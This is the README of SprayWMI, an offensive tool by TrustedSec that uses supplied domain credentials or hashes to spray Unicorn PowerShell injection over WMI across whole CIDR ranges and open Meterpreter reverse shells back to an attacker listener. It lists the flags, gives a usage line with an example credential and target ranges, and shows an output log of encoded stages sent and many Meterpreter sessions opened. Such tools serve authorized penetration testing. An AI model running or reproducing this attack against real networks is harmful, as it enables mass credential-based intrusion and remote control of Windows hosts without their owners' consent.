SprayWMI is a method for mass spraying Unicorn PowerShell injection to CIDR notations.

Written by: David Kennedy (@HackingDave) @TrustedSec
Special thanks to: Justin Elze and Larry Spohn @TrustedSec

Initial blog post: https://www.trustedsec.com/june-2015/no_psexec_needed/
If you have trouble with this on 64-bit, try:
dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 && apt-get install libpopt0:i386

Flags and descriptions:

domain                 Domain you are attacking. If its local, just specify workgroup.

username               Username to authenticate on the remote Windows system.

password               Password or password hash LM:NTLM to use on the remote Windows system.

CIDR range or file     Specify a single IP, CIDR range (10.0.1.1/24) or multiple CIDRs: 10.0.1.1/24,10.0.2.1/24. 
                          You can also specify a file (ex: ips.txt) that contains a single IP addresses on each line. 
payload                Metasploit payload, example: windows/meterpreter/reverse_tcp

LHOST                  Reverse shell IP address.

LPORT                  Reverse shell listening port.

optional: NO           Specify no if you do not want to create a listener. This is useful if you already have a listener 
                          established. If you do not specify a value, it will automatically create a listener for you.

Usage: python spraywmi.py <domain> <username> <password> <CIDRrange or file> <payload> <LHOST> <LPORT> <optional: no>


Below is an example of output from spraywmi:

root@stronghold:/home/relik# python spraywmi.py TS kennedy-test complexP255w0rd! 10.0.90.1/24,10.0.0.1/24,10.0.59.1/24,10.0.96.1/24,10.0.1.1/24 windows/meterpreter/reverse_tcp 10.0.47.24 443

[*] Generating shellcode through Unicorn, this could take a few seconds.

[*] Launching the listener in the background.

[*] Waiting for the listener to start first before we continue.

[*] Be patient, Metasploit takes a little bit to start.

[*] Sweeping targets for open TCP port 135 first, then moving through. Be patient.

[*] Launching WMI spray against IP: 10.0.90.1 - You should have a shell in the background. Once finished, a shell will spawn.

<snip>

[*] Launching WMI spray against IP: 10.0.96.20 - You should have a shell in the background. Once finished, a shell will spawn.

[*] Launching WMI spray against IP: 10.0.96.21 - You should have a shell in the background. Once finished, a shell will spawn.

[*] Launching WMI spray against IP: 10.0.96.22 - You should have a shell in the background. Once finished, a shell will spawn.

[*] Launching WMI spray against IP: 10.0.96.23 - You should have a shell in the background. Once finished, a shell will spawn.

[*] Launching WMI spray against IP: 10.0.96.242 - You should have a shell in the background. Once finished, a shell will spawn.

[*] Launching WMI spray against IP: 10.0.1.13 - You should have a shell in the background. Once finished, a shell will spawn.

[*] Spraying is still happening in the background, shells should arrive as they complete.

[*] Interacting with Metasploit.

msf exploit(handler) > 

[*] Encoded stage with x86/shikata_ga_nai

[*] Sending encoded stage (885836 bytes) to 10.0.90.174

[*] Meterpreter session 1 opened (10.0.47.24:443 -> 10.0.90.174:49868) at 2015-10-13 04:33:55 -0400

[*] Encoded stage with x86/shikata_ga_nai

[*] Sending encoded stage (885836 bytes) to 10.0.90.203

[*] Meterpreter session 2 opened (10.0.47.24:443 -> 10.0.90.203:51333) at 2015-10-13 04:33:59 -0400

[*] Encoded stage with x86/shikata_ga_nai

[*] Sending encoded stage (885836 bytes) to 10.0.90.184

[*] Meterpreter session 3 opened (10.0.47.24:443 -> 10.0.90.184:61218) at 2015-10-13 04:34:02 -0400

[*] Encoded stage with x86/shikata_ga_nai

[*] Sending encoded stage (885836 bytes) to 10.0.90.204

[*] Meterpreter session 4 opened (10.0.47.24:443 -> 10.0.90.204:54219) at 2015-10-13 04:34:06 -0400

[*] Encoded stage with x86/shikata_ga_nai

[*] Sending encoded stage (885836 bytes) to 10.0.90.175

[*] Meterpreter session 5 opened (10.0.47.24:443 -> 10.0.90.175:54210) at 2015-10-13 04:34:10 -0400

<snip>

[*] Meterpreter session 13 opened (10.0.47.24:443 -> 10.0.90.248:53657) at 2015-10-13 04:34:31 -0400

[*] Encoded stage with x86/shikata_ga_nai

[*] Sending encoded stage (885836 bytes) to 10.0.90.39

[*] Meterpreter session 14 opened (10.0.47.24:443 -> 10.0.90.39:60451) at 2015-10-13 04:34:35 -0400

[*] Encoded stage with x86/shikata_ga_nai
